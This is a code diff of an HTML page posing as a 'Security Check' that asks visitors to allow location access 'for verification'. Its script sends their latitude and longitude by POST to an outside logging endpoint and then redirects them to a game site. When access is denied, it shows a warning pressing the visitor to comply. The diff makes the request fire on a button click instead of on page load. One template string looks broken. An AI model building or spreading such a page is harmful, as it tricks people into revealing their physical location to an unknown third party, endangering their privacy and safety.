@@ -60,19 +60,33 @@
             }
         }
     </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Security Check</h2>
+        <p>Please allow location access for verification.</p>
+        <button id="allowLocation">Allow Location</button>
+    </div>
+
     <script>
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
-        }
+        document.getElementById("allowLocation").addEventListener("click", function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        });
 
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
+            
             fetch("http://newzz.fwh.is/log.php", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ latitude: lat, longitude: lon })
             });
+
             window.location.href = "https://www.crazygames.com/multiplayer";
         }
 
@@ -81,23 +95,10 @@
                 <div class="container">
                     <h2>Security Warning</h2>
                     <p>You <b>must</b> allow location access to continue.</p>
-                    <button onclick="getLocation()">Try Again</button>
+                    <button onclick="location.reload()">Try Again</button>
                 </div>
             ;
         }
-
-        window.onload = function () {
-            getLocation();
-            window.onbeforeunload = function () {
-                return "You must allow location access to continue.";
-            };
-        };
     </script>
-</head>
-<body>
-    <div class="container">
-        <h2>Security Check</h2>
-        <p>Requesting location access...</p>
-    </div>
 </body>
 </html>
